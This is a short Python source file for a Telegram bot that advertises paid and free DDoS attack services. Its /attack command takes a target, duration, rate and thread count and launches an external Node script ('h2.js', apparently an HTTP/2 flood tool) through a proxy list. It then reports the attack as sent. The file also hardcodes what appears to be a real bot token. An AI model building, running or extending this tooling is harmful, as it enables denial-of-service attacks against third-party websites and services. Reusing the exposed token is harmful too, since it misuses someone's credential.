from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import subprocess

# Thay YOUR_TELEGRAM_BOT_TOKEN bằng mã token bạn nhận được từ BotFather
TOKEN = '6151599157:AAEXFXPYCjjSpCusnHQeALrbEppY32qQdrc'

async def start(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text(
        'Welcome to Xiao DDoS Bot!\n\n'
        'XiaoNam Bot Free and Paid DDoS Attack Services\n\n'
        'Type /attack to see the attack usage!\n\n'
        '----------------------------------------------\n\n'
        'Best C2/API Of 2024 -> @Xiaocoderz🚀'
    )

async def attack(update: Update, context: CallbackContext) -> None:
    if len(context.args) != 4:
        await update.message.reply_text('Usage: /attack <TARGET> <TIME> <RATES> <THREAD>')
        return

    target, time, rates, thread = context.args
    proxy_file = 'proxy.txt'

    command = ['node', 'h2.js', target, time, rates, thread, proxy_file]
    
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        output = result.stdout
        await update.message.reply_text(
            f'Attack successfully sent!\n\n'
            f'- 🚀 Target: {target} | Time: {time} | Rates: {rates} | Thread: {thread}\n\n'
            f'👤 Sender:\n\n'
            f'------------------------------------\n\n'
            f'Best C2/API of 2024 -> @Xiaocoderz'
        )
    except subprocess.CalledProcessError as e:
        await update.message.reply_text(f'Error: {e}')

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('attack', attack))

    application.run_polling()

if __name__ == '__main__':
    main()
